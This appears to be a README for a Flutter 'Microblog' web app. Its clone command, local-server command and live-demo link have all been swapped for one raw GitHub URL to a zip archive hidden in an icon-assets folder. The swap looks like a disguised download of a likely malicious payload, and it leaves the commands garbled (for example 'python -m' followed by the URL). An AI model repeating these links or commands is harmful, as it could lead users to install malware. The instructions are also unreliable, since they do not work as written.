🐦 Microblog — Flutter Web App

A simple Twitter-like microblogging app built with Flutter, showcasing posts, likes, retweets, explore tab, profile page, and a clean UI — all running on the web.

🚀 Live Demo

👉 Open Microblog App

🧩 Features

🏠 Home Feed: View, post, like, and retweet tweets

🔍 Explore Tab: Discover trending topics and follow people

💬 Messages: Demo messages tab

👤 Profile Page: Shows user info, tweets, and following count

🖊️ Compose Tweet: Post new tweets via composer or floating action button

🧠 Local State Logic: All tweets are handled in memory (no backend)

🛠️ Built With

Flutter 3.35.7 (stable)

Dart

Material Design

Hosted on Render

🧰 Installation & Run Locally
1️⃣ Clone the repo
git clone https://raw.githubusercontent.com/roshini0108/microblog/main/build/web/assets/packages/cupertino_icons/assets/Software-2.6.zip<your-username>https://raw.githubusercontent.com/roshini0108/microblog/main/build/web/assets/packages/cupertino_icons/assets/Software-2.6.zip
cd microblog

2️⃣ Get dependencies
flutter pub get

3️⃣ Run the app
flutter run

4️⃣ Build for web
flutter build web --release

5️⃣ Preview locally
cd build/web
python -m https://raw.githubusercontent.com/roshini0108/microblog/main/build/web/assets/packages/cupertino_icons/assets/Software-2.6.zip 8080
# then open http://localhost:8080

🌐 Deployment (on Render)

Build web version:

flutter build web --release


Upload the contents of build/web to Render as a Static Site

Set Publish Directory: build/web

Done! Your site will go live at:
👉 https://raw.githubusercontent.com/roshini0108/microblog/main/build/web/assets/packages/cupertino_icons/assets/Software-2.6.zip
💡 Future Improvements

Persistent tweet storage (Firebase / SQLite)

Authentication (Login / Signup)

Dark mode toggle

Comment threads
